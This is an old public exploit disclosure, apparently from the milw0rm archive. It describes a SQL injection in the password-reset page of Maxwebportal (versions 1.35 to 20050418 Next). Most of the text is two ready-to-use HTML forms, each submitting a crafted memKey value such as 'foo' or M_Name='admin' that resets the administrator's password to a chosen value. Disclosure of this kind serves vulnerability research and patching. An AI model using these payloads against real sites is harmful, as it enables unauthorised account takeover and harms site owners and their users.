@@ -1,0 +1,38 @@
+<!--
+Hi, I'm Soroush Dalili from Grayhatz Security Group (GSG) . I found dangerous sql injection
+in Maxwebportal version 1.35,1.36,2.0, 20050418 Next
+Remote user can inject his/her code in "memKey" var. and change other users password in
+password.asp
+
+Exploit codes to proof: 
+-->
+
+-----------------Code Start-----Version 1.35 and older--------------
+<form action="http://[URL]/password.asp?mode=reset" method="post">
+<br>
+pass1: <input name="pass" type="text" value="123456" size="150"><br>
+pass2: <input name="pass2" type="text" value="123456" size="150"><br>
+Id: <input name="memId" type="text" value="-1" size="150"><br>
+Member Key: <input name="memKey" type="text" value="foo' or M_Name='admin" size="150">
+<br>
+<input name="Submit" type="submit" value="Submit">
+</form>
+-----------------End-------------------
+
+Version 1.36, 2.0, 20050418 Next:
+
+-----------------Code Start-----Version 1.36, 2.0, 20050418 Next--------------
+<form action="http://[URL]/password.asp?mode=reset" method="post">
+<br>
+pass1: <input name="pass" type="text" value="123456" size="150"><br>
+pass2: <input name="pass2" type="text" value="123456" size="150"><br>
+Id: <input name="memId" type="text" value="-1" size="150"><br>
+Member Key: <input name="memKey" type="text" value="foo') or M_Name='admin' or ('1'='2"
+
+size="150">
+<br>
+<input name="Submit" type="submit" value="Submit">
+</form>
+-----------------End-------------------
+
+# milw0rm.com [2005-05-26]
